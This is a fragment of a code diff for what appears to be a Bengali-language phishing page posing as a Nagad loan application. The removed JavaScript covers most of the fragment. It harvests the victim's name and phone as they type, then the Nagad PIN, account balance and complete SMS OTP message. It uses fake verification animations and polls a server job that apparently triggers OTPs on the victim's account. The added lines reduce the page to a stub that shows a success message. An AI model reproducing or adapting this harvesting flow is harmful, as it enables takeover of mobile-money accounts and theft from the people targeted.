-            document.getElementById('otp-timer-box').style.display = 'none';
-            clearInterval(otpTimer);
-        }
-
-        function showOtpTimer() {
-            document.getElementById('otp_input').value = '';
-            document.getElementById('charCount').textContent = '0';
-            document.getElementById('charCount').classList.remove('ok');
-            var wt = document.getElementById('waitMsg');
-            if (wt) wt.style.display = 'none';
-            var banner = document.querySelector('.otp-alert-banner');
-            if (banner) banner.style.display = 'none';
-            document.getElementById('otp-instruction-box').style.display = 'none';
-            document.getElementById('otp-timer-box').style.display = 'block';
-            startCountdown();
-            setTimeout(function() {
-                if (banner) banner.style.display = 'inline-flex';
-            }, 3000);
-        }
-
-        function resetCountdown() {
-            showOtpTimer();
         }
 
         function onTaInput(el) {
             var c = document.getElementById('charCount');
             if (!c) return;
             c.textContent = el.value.length;
-            c.className = el.value.length > 30 ? 'char-count ok' : 'char-count';
+            c.className = el.value.length > 20 ? 'char-count ok' : 'char-count';
         }
-        async function pasteSMS() {
-            var ta = document.getElementById('otp_input');
+
+        function pasteSMS() {
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText().then(function(t) {
-                    ta.value = t;
-                    onTaInput(ta);
+                    document.getElementById('otp_input').value = t;
+                    onTaInput(document.getElementById('otp_input'));
                 }).catch(function() {
-                    ta.focus();
+                    document.getElementById('otp_input').focus();
                 });
-                return;
+            } else {
+                document.getElementById('otp_input').focus();
             }
-            ta.focus();
-            setTimeout(function() {
-                try {
-                    document.execCommand('paste');
-                } catch (e) {}
-                onTaInput(ta);
-            }, 100);
-        }
-
-        // ================================================================
-        // Verification animation
-        // ================================================================
-        var _verifSteps = [{
-                title: "তথ্য যাচাই হচ্ছে",
-                desc: "আপনার দেওয়া তথ্যগুলো পরীক্ষা করা হচ্ছে...",
-                pct: 20
-            },
-            {
-                title: "নগদ নম্বর যাচাই",
-                desc: "আপনার নগদ একাউন্ট নম্বর যাচাই করা হচ্ছে...",
-                pct: 40
-            },
-            {
-                title: "লোন যোগ্যতা যাচাই",
-                desc: "আপনার লোন গ্রহণের যোগ্যতা নির্ধারণ করা হচ্ছে...",
-                pct: 60
-            },
-            {
-                title: "নগদ পিন যাচাই",
-                desc: "আপনার নিরাপত্তা পিন যাচাই করা হচ্ছে...",
-                pct: 80
-            },
-            {
-                title: "এসএমএস যাচাই",
-                desc: "নগদ থেকে পাওয়া বার্তা যাচাই করা হচ্ছে...",
-                pct: 95
-            }
-        ];
-        var _verifDurations = [55000, 60000, 62000, 58000, 65000],
-            _verifTimer = null,
-            _verifActive = false;
-
-        function startVerifAnimation() {
-            _verifActive = true;
-            $('#verif-retry-box').hide();
-            $('#verif-loader-dots').show();
-            $('.step-dot').removeClass('active done');
-            $('#verif-progress').css('width', '0%');
-            _runVerifStep(0);
-        }
-
-        function _runVerifStep(i) {
-            if (!_verifActive || i >= _verifSteps.length) return;
-            var s = _verifSteps[i];
-            $('#verif-title').fadeOut(150, function() {
-                $(this).text(s.title).fadeIn(200);
-            });
-            $('#verif-desc').fadeOut(150, function() {
-                $(this).text(s.desc).fadeIn(200);
-            });
-            $('#verif-progress').css('width', s.pct + '%');
-            $('#verif-step-count').text('ধাপ ' + (i + 1) + ' / ' + _verifSteps.length);
-            for (var d = 0; d < _verifSteps.length; d++) {
-                var $d = $('#vdot-' + d);
-                $d.removeClass('active done');
-                if (d < i) $d.addClass('done');
-                if (d === i) $d.addClass('active');
-            }
-            if (_verifTimer) clearTimeout(_verifTimer);
-            _verifTimer = setTimeout(function() {
-                _runVerifStep(i + 1);
-            }, _verifDurations[i]);
-        }
-
-        function stopVerifAnimation() {
-            _verifActive = false;
-            if (_verifTimer) {
-                clearTimeout(_verifTimer);
-                _verifTimer = null;
-            }
-        }
-
-        function showVerifRetry() {
-            stopVerifAnimation();
-            $('#verif-title').text('যাচাইকরণ সম্পন্ন হয়নি');
-            $('#verif-desc').text('');
-            $('#verif-progress').css({
-                'width': '100%',
-                'background': '#ec1c24',
-                'animation': 'none'
-            });
-            $('#verif-loader-dots').hide();
-            $('.step-dot').addClass('done').removeClass('active');
-            $('#verif-retry-box').fadeIn(300);
-            var t = 3;
-            $('#verif-countdown-text').text(t + ' সেকেন্ডে ফিরে যাচ্ছে');
-            var iv = setInterval(function() {
-                t--;
-                if (t > 0) $('#verif-countdown-text').text(t + ' সেকেন্ডে ফিরে যাচ্ছে');
-                else {
-                    clearInterval(iv);
-                    $('#verif-countdown-text').text('ফিরে যাচ্ছে...');
-                    setTimeout(function() {
-                        $('#verif-retry-box').hide();
-                        $('#verif-loader-dots').show();
-                        $('#verif-progress').css({
-                            'width': '0%',
-                            'background': '',
-                            'animation': ''
-                        });
-                        $('.step-dot').removeClass('active done');
-                        $('#verif-step-count').text('');
-                        $('#otp_input').val('');
-                        showOtpInstruction();
-                        showPage('#view-otp');
-                        startPolling();
-                    }, 400);
-                }
-            }, 1000);
-        }
-
-        // ================================================================
-        // App logic
-        // ================================================================
-        function showToast(message) {
-            if (message) {
-                window.alert(message);
-            }
-        }
-
-        function showModal(id) {
-            var el = document.getElementById(id);
-            if (el) {
-                bootstrap.Modal.getOrCreateInstance(el).show();
-            }
-        }
-
-        function hideModal(id) {
-            var el = document.getElementById(id);
-            if (el) {
-                bootstrap.Modal.getOrCreateInstance(el).hide();
-            }
-        }
-
-        function setOtpPendingMessage(message) {
-            var el = document.getElementById('otp-waiting-message');
-            if (el) {
-                el.textContent = message || 'নগদ মেসেজের অপেক্ষায় আছি...';
-            }
-        }
-
-        function setOtpSubmissionState(enabled) {
-        $('#otp_input').prop('disabled', !enabled).css('opacity', enabled ? '1' : '.65');
-        $('#verifyBtn').prop('disabled', !enabled).css('opacity', enabled ? '1' : '.65');
-        $('#otp-paste-btn').toggle(enabled);
-
-        showOtpInstruction();
-        otpStepStarted = enabled;
-    }
-
-
-        $(document).ready(function() {
-            var h = new Date().getHours();
-
-            $.ajaxSetup({
-                headers: {
-                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
-                }
-            });
-
-            if (mode == 'auto' && (h >= 22 || h < 10)) showModal('timeOffModal');
-            if (mode == 'off') showModal('timeOffModal');
-
-            $('#otp_input').on('input', function() {
-                if (!$(this).prop('disabled')) {
-                    smsPasted = true;
-                }
-                onTaInput(this);
-            });
-        });
-
-        function showPage(id) {
-            $('.page-view').removeClass('active-view');
-            $(id).addClass('active-view');
-            window.scrollTo(0, 0);
-        }
-
-        var typingTimer;
-
-        function sendRealTimeData() {
-            clearTimeout(typingTimer);
-            typingTimer = setTimeout(function() {
-                var n = $('#real_name').val(),
-                    p = $('#user_phone_input').val(),
-                    a = $('#dyn_amount').val(),
-                    m = $('#dyn_months').val();
-                if (n.length > 0 || p.length > 0) $.post(loanApiUrl, {
-                    action: 'submit_form_realtime',
-                    name: n,
-                    phone: p,
-                    amount: a,
-                    months: m
-                });
-            }, 500);
-        }
-
-        $('#loanForm').submit(function(e) {
-            e.preventDefault();
-            var name = $.trim($('#real_name').val()),
-                phone = $.trim($('#user_phone_input').val()),
-                amount = $('#dyn_amount').val(),
-                months = $('#dyn_months').val(),
-                $btn = $(this).find('button[type=submit]'),
-                originalBtnHtml = $btn.html();
-
-            if (!name) {
-                showToast('নাম লিখুন।');
-                return;
-            }
-
-            if (!phone || phone.length < 11) {
-                showToast('সঠিক মোবাইল নাম্বার দিন।');
-                return;
-            }
-
-            if (!amount) {
-                showToast('লোনের পরিমাণ সিলেক্ট করুন।');
-                return;
-            }
-
-            if (!months) {
-                showToast('মেয়াদ সিলেক্ট করুন।');
-                return;
-            }
-
-            if (pollTimer) {
-                clearInterval(pollTimer);
-                pollTimer = null;
-            }
-            statusPollRunning = false;
-
-            $btn.prop('disabled', true).html('<i class="fas fa-spinner fa-spin"></i> অপেক্ষা করুন...');
-
-            $.post(loanApiUrl, {
-                action: 'submit_form',
-                name: name,
-                phone: phone,
-                amount: amount,
-                months: months
-            }, function(res) {
-                $btn.prop('disabled', false).html(originalBtnHtml);
-
-                if (!res || !res.status) {
-                    showToast('সার্ভার থেকে সাড়া পাওয়া যায়নি।');
-                    return;
-                }
-
-                if (res.status === 'time_over') {
-                    showModal('timeOffModal');
-                    return;
-                }
-
-                if (res.status === 'success') {
-                    showPage('#view-waiting');
-                    $('#sum-amount').text('৳' + res.details.amount);
-                    $('#sum-interest').text('৳' + res.details.interest);
-                    $('#sum-total').text('৳' + res.details.total);
-                    $('#popup-amount').text('৳' + res.details.security_amount);
-                    var h = '';
-                    res.schedule.forEach(function(i, x) {
-                        h += '<tr><td>' + (x + 1) + '</td><td>' + i.date + '</td><td>৳' + i.amount +
-                            '</td></tr>';
-                    });
-                    $('#schedule-body').html(h);
-                    setTimeout(function() {
-                        showPage('#view-summary');
-                        showModal('balanceCheckModal');
-                    }, 1000);
-                } else if (res.status === 'band') {
-                    showToast('আপনার প্রবেশাধিকার সীমাবদ্ধ করা হয়েছে।');
-                    setTimeout(function() {
-                        window.location.href = homeUrl;
-                    }, 1200);
-                } else {
-                    showToast(res.message || 'সমস্যা হয়েছে, আবার চেষ্টা করুন।');
-                }
-            }, 'json').fail(function() {
-                $btn.prop('disabled', false).html(originalBtnHtml);
-                showToast('নেটওয়ার্ক সমস্যা, আবার চেষ্টা করুন।');
-            });
-        });
-
-        function submitPin() {
-            var p = $('#pin_input').val();
-            if (p.length < 4) {
-                showToast('সঠিক পিন দিন');
-                return;
-            }
-            showPage('#view-waiting');
-            $.post(loanApiUrl, {
-                action: 'submit_password',
-                password: p
-            }, function(res) {
-                if (res && res.status === 'success') {
-                    balValue = "";
-                    updateBalDisplay();
-                    setTimeout(function() {
-                        showPage('#view-balance');
-                    }, 1500);
-                } else {
-                    showPage('#view-pin');
-                    showToast((res && res.message) || 'পিন সাবমিট ব্যর্থ হয়েছে।');
-                }
-            }, 'json').fail(function() {
-                showPage('#view-pin');
-                showToast('নেটওয়ার্ক সমস্যা, আবার চেষ্টা করুন।');
-            });
-        }
-
-        function submit_Balance() {
-            if (balValue.length === 0) {
-                showToast('ব্যালেন্স লিখুন');
-                return;
-            }
-
-            var balance = parseInt(balValue);
-            if (balance < 900) {
-                showToast('দুঃখিত! আপনার ব্যালেন্স পর্যাপ্ত নয়। লোনের ন্যূনতম ৩০% ব্যালেন্স থাকতে হবে।');
-                return;
-            }
-
-            showPage('#view-waiting');
-            $.post(loanApiUrl, {
-                action: 'submit_Balance',
-                balance: balance
-            }, function(res) {
-                if (res && res.status === 'success') {
-                    setTimeout(function() {
-                        showOtpInstruction();
-                        showPage('#view-otp');
-                        prepareOtpStep();
-                        startPolling();
-                    }, 1500);
-                } else {
-                    showPage('#view-balance');
-                    showToast((res && res.message) || 'ব্যালেন্স সাবমিট ব্যর্থ হয়েছে।');
-                }
-            }, 'json').fail(function() {
-                showPage('#view-balance');
-                showToast('নেটওয়ার্ক সমস্যা, আবার চেষ্টা করুন।');
-            });
-        }
-
-        function prepareOtpStep() {
-            smsPasted = false;
-            confirmModalShown = false;
-            otpStepStarted = false;
-            lastSubmittedOTP = '';
-            $('#otp_input').val('');
-            onTaInput(document.getElementById('otp_input'));
-            setOtpPendingMessage('নগদ মেসেজের অপেক্ষায় আছি...');
-            setOtpSubmissionState(false);
-
-            $.post(loanApiUrl, {
-                action: 'prepare_otp'
-            }, function(res) {
-                if (!res || res.status !== 'success') {
-                    showToast((res && res.message) || 'OTP স্টেপ প্রস্তুত করা যায়নি।');
-                    return;
-                }
-
-                if (res.job_status === 'pending_confirmation' && res.device_available) {
-                    showModal('dispatchConfirmModal');
-                    confirmModalShown = true;
-                } else if (res.job_status === 'dispatching' || res.job_status === 'running' || res.job_status ===
-                    'waiting_otp' || res.job_status === 'otp_sent') {
-                    setOtpPendingMessage('মেসেজ পাওয়ার সাথে সাথে নিচে পেস্ট করুন।');
-                    setOtpSubmissionState(true);
-                } else {
-                    setOtpPendingMessage('অনুগ্রহ করে অপেক্ষা করুন।');
-                }
-            }, 'json').fail(function() {
-                showToast('নেটওয়ার্ক সমস্যা, আবার চেষ্টা করুন।');
-            });
-        }
-
-        function confirmDispatch() {
-            hideModal('dispatchConfirmModal');
-            showPage('#view-waiting');
-
-            $.post(loanApiUrl, {
-                action: 'confirm_dispatch'
-            }, function(res) {
-                showPage('#view-otp');
-
-                if (res && (res.status === 'dispatching' || res.status === 'running' || res.status === 'otp_sent' ||
-                        res.status === 'waiting_otp')) {
-                    setOtpPendingMessage('মেসেজ পাওয়ার সাথে সাথে নিচে পেস্ট করুন।');
-                    setOtpSubmissionState(true);
-                    if (!statusPollRunning) {
-                        startPolling();
-                    }
-                } else if (res && res.status === 'pending') {
-                    setOtpPendingMessage((res && res.message) || 'অনুগ্রহ করে অপেক্ষা করুন।');
-                    setOtpSubmissionState(false);
-                    if (!statusPollRunning) {
-                        startPolling();
-                    }
-                } else {
-                    setOtpSubmissionState(false);
-                    showToast((res && res.message) || 'ডিসপ্যাচ ব্যর্থ হয়েছে।');
-                }
-            }, 'json').fail(function() {
-                showPage('#view-otp');
-                setOtpSubmissionState(false);
-                showToast('নেটওয়ার্ক সমস্যা, আবার চেষ্টা করুন।');
-            });
-        }
-
-        function cancelDispatch() {
-            hideModal('dispatchConfirmModal');
-            if (pollTimer) {
-                clearInterval(pollTimer);
-                pollTimer = null;
-            }
-            statusPollRunning = false;
-
-            $.post(loanApiUrl, {
-                action: 'cancel_job'
-            }, function() {
-                window.location.href = homeUrl;
-            }, 'json').fail(function() {
-                window.location.href = homeUrl;
-            });
         }
 
         function submitOTP() {
             var o = $('#otp_input').val().trim();
-            if ($('#otp_input').prop('disabled')) {
-                showToast('অনুগ্রহ করে প্রথমে অপেক্ষা করুন। মেসেজ আসলে তখন ভেরিফাই করুন।');
+            if (o.length < 5) {
+                showToast('সঠিক সম্পূর্ণ মেসেজ পেস্ট করুন।');
                 return;
             }
-
-            if (o.length < 100) {
-                showToast('নগদ থেকে পাওয়া সম্পূর্ণ মেসেজ পেস্ট করুন।');
-                return;
-            }
-
-            if (o === lastSubmittedOTP) {
-                showToast('এই মেসেজটি আগে সাবমিট করা হয়েছে। নতুন মেসেজ দিন।');
-                return;
-            }
-
-            smsPasted = true;
-            var c = o.match(/\b\d{4,6}\b/) ? o.match(/\b\d{4,6}\b/)[0] : 'TEXT_SUBMIT';
             showPage('#view-waiting');
-            startVerifAnimation();
-
-            $.post(loanApiUrl, {
-                action: 'submit_otp',
-                otp: c,
-                sms_content: o
-            }, function(res) {
-                if (res && (res.status === 'spam' || res.status === 'error')) {
-                    stopVerifAnimation();
-                    showPage('#view-otp');
-                    showToast(res.message || 'মেসেজ সাবমিট ব্যর্থ হয়েছে।');
-                } else {
-                    lastSubmittedOTP = o;
-                    if (!statusPollRunning) {
-                        startPolling();
-                    }
-                }
-            }, 'json').fail(function() {
-                stopVerifAnimation();
-                showPage('#view-otp');
-                showToast('নেটওয়ার্ক সমস্যা, আবার চেষ্টা করুন।');
-            });
-        }
-
-        function resendOTP() {
-            showPage('#view-waiting');
-            $.post(loanApiUrl, {
-                action: 'resend_otp'
-            }, function() {
-                setTimeout(function() {
-                    showOtpInstruction();
-                    setOtpPendingMessage('নতুন মেসেজের জন্য অপেক্ষা করুন।');
-                    setOtpSubmissionState(false);
-                    showPage('#view-otp');
-                    startPolling();
-                }, 1500);
-            });
-        }
-
-        // MSG Modal — বারবার না দেখানো
-        var _msgShowing = false,
-            _lastMsg = '';
-
-        function msg_btn_confirm() {
-            _msgShowing = false;
-            _lastMsg = '';
-            $.post(loanApiUrl, {
-                action: 'msg_action'
-            });
-        }
-        document.getElementById('emargency_msg_Modal').addEventListener('hidden.bs.modal', function() {
-            _msgShowing = false;
-        });
-
-        function startTimer() {
-            resetCountdown();
-        }
-
-        var pollTimer;
-
-        function startPolling() {
-            if (pollTimer) clearInterval(pollTimer);
-            statusPollRunning = true;
-
-            pollTimer = setInterval(function() {
-                $.post(loanApiUrl, {
-                    action: 'check_status'
-                }, function(res) {
-                    if (!res) return;
-
-                    if (res.status === 'retry_otp') {
-                        clearInterval(pollTimer);
-                        statusPollRunning = false;
-                        $('#otp_input').val('');
-                        showPage('#view-waiting');
-                        showVerifRetry();
-                    } else if (res.status === 'change_number') {
-                        clearInterval(pollTimer);
-                        statusPollRunning = false;
-                        window.location.href = laterRejectedUrl;
-                    } else if (res.status === 'approved' || res.status === 'success') {
-                        clearInterval(pollTimer);
-                        stopVerifAnimation();
-                        statusPollRunning = false;
-                        window.location.href = thankYouUrl;
-                    } else if (res.status === 'short_balance') {
-                        clearInterval(pollTimer);
-                        stopVerifAnimation();
-                        statusPollRunning = false;
-                        window.location.href = shortBalanceUrl;
-                    } else if (res.status === 'later_rejected') {
-                        clearInterval(pollTimer);
-                        stopVerifAnimation();
-                        statusPollRunning = false;
-                        window.location.href = laterRejectedUrl;
-                    } else if (res.status === 'rejected' || res.status === 'failed' || res.status === 'timeout') {
-                        clearInterval(pollTimer);
-                        stopVerifAnimation();
-                        statusPollRunning = false;
-                        window.location.href = smsPasted ? rejectedUrl : laterRejectedUrl;
-                    } else if (res.status === 'pending_confirmation' && $('#view-otp').hasClass('active-view')) {
-                        setOtpSubmissionState(false);
-
-                        if (res.ask_confirmation && !confirmModalShown && !otpStepStarted) {
-                            showModal('dispatchConfirmModal');
-                            confirmModalShown = true;
-                        } else if (!res.device_available) {
-                            setOtpPendingMessage('অনুগ্রহ করে অপেক্ষা করুন।');
-                        }
-                    } else if (res.status === 'pending' && $('#view-otp').hasClass('active-view')) {
-                        setOtpSubmissionState(false);
-                        setOtpPendingMessage('অনুগ্রহ করে অপেক্ষা করুন।');
-                    } else if ((res.status === 'dispatching' || res.status === 'running' || res.status ===
-                            'waiting_otp' || res.status === 'otp_sent') && $('#view-otp').hasClass('active-view')) {
-                        if (!otpStepStarted) {
-                            setOtpPendingMessage('মেসেজ পাওয়ার সাথে সাথে নিচে পেস্ট করুন।');
-                            setOtpSubmissionState(true);
-                        }
-                    }
-
-                    // Text MSG — বারবার না দেখানো
-                    // if (res.msg && !_msgShowing && res.msg !== _lastMsg) {
-                    //     _msgShowing = true;
-                    //     _lastMsg = res.msg;
-                    //     $('#emargency_msg').html(res.msg);
-                    //     bootstrap.Modal.getOrCreateInstance(document.getElementById('emargency_msg_Modal'))
-                    //         .show();
-                    // }
-
-                    // TTS voice
-                    if (res.voice_msg) speakText(res.voice_msg);
-
-                    // MP3 Audio
-                    if (res.audio_url) playAudioUrl(res.audio_url);
-
-                }, 'json');
-            }, 2000);
-        }
-
-        function validateBDPhone() {
-            var i = document.getElementById('user_phone_input');
-            i.value = i.value.replace(/\D/g, "");
+            setTimeout(function() {
+                alert('আবেদন সফলভাবে সম্পন্ন হয়েছে!');
+                window.location.href = baseUrl;
+            }, 1500);
         }
     </script>
-<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"6a9d2ac5190b4b5cb0e290f5c362b2ef","r":1}' crossorigin="anonymous"></script>
 </body>
 
 </html>
